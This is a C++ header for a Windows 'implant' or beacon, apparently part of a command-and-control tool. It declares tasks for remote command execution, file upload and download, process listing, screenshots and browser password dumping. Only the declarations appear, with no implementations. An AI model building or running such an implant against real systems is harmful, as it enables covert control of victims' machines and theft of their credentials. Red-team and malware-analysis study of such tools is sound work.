#pragma once

#define _SILENCE_CXX17_C_HEADER_DEPRECATION_WARNING


#include "results.h"

#include <variant>
#include <string>
#include <string_view>
#include <array>
#include <sstream>
#include <fstream>
#include <cstdlib>
#include <istream>
#include <atlimage.h>

#include <boost/property_tree/ptree.hpp>

#pragma comment (lib,"gdiplus.lib")

// Define implant configuration
struct Configuration {
	Configuration(double meanDwell, bool isRunning);
	const double meanDwell;
	const bool isRunning;
};


// Tasks
// ===========================================================================================

// PingTask
// -------------------------------------------------------------------------------------------
struct PingTask {
	PingTask(const std::string& id);
	constexpr static std::string_view key{ "ping" };
	[[nodiscard]] Result run() const;
	const std::string id;
};


// ConfigureTask
// -------------------------------------------------------------------------------------------
struct ConfigureTask {
	ConfigureTask(const std::string& id,
		double meanDwell,
		bool isRunning,
		std::function<void(const Configuration&)> setter);
	constexpr static std::string_view key{ "configure" };
	[[nodiscard]] Result run() const;
	const std::string id;
private:
	std::function<void(const Configuration&)> setter;
	const double meanDwell;
	const bool isRunning;
};

// ExecuteTask
// -------------------------------------------------------------------------------------------
struct ExecuteTask {
	ExecuteTask(const std::string& id, std::string command);
	constexpr static std::string_view key{ "execute" };
	[[nodiscard]] Result run() const;
	const std::string id;
private:
	const std::string command;
};

// ListThreadsTask
// -------------------------------------------------------------------------------------------
struct ListThreadsTask {
	ListThreadsTask(const std::string& id, std::string processId);
	constexpr static std::string_view key{ "list-threads" };
	[[nodiscard]] Result run() const;
	const std::string id;
private:
	const std::string processId;
};

// ListRunningProcesses
// -------------------------------------------------------------------------------------------
struct ListRunningProcesses {
	ListRunningProcesses(const std::string& id);
	constexpr static std::string_view key{ "list-processes" };
	[[nodiscard]] Result run() const;
	const std::string id;
};

// KillBeaconProcess
// -------------------------------------------------------------------------------------------
struct KillBeaconProcess {
	KillBeaconProcess(const std::string& id);
	constexpr static std::string_view key{ "kill" };
	[[nodiscard]] Result run() const;
	const std::string id;
};

// DownloadFileTask
// -------------------------------------------------------------------------------------------
struct DownloadFileTask {
	DownloadFileTask(const std::string& id, std::string path);
	constexpr static std::string_view key{ "download" };
	[[nodiscard]] Result run() const;
	const std::string id;
private:
	const std::string path;
};

// UploadFileTask
// -------------------------------------------------------------------------------------------
struct UploadFileTask {
	UploadFileTask(const std::string& id, std::string filename);
	constexpr static std::string_view key{ "upload" };
	[[nodiscard]] Result run() const;
	const std::string id;
private:
	const std::string filename;
};

// ScreenshotTask
// -------------------------------------------------------------------------------------------
struct ScreenshotTask {
	ScreenshotTask(const std::string& id);
	constexpr static std::string_view key{ "screenshot" };
	[[nodiscard]] Result run() const;
	const std::string id;
};

// DumpBrowserPasswordsTask
// -------------------------------------------------------------------------------------------
struct DumpBrowserPasswordsTask {
	DumpBrowserPasswordsTask(const std::string& id);
	constexpr static std::string_view key{ "browser-dump" };
	[[nodiscard]] Result run() const;
	const std::string id;
};

// ===========================================================================================

// REMEMBER: Any new tasks must be added here too!
using Task = std::variant<PingTask, ConfigureTask, ExecuteTask, ListThreadsTask, ListRunningProcesses, KillBeaconProcess, DownloadFileTask, UploadFileTask, ScreenshotTask, DumpBrowserPasswordsTask>;

[[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
	std::function<void(const Configuration&)> setter);